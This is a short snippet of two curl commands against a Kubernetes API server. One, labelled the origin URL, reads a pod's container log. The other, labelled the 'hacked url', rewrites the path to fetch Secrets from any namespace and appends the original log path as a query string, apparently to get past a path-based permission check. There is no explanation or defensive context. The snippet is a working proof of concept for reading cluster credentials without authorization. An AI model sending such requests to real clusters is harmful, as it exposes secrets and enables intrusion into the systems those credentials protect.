# origin url
curl --cacert ./ca.crt --cert ./cert --key key  "https://${apiserver}:6443/api/v1/namespaces/istio-dev/pods/service-account-simple/log?container=test-container"

# the hacked url
curl --cacert ./ca.crt --cert ./cert --key key "https://${apiserver}:6443/api/v1/namespaces/${ns}/secrets/${secrets}?feihua=/pods/service-account-simple/log?container=test-container"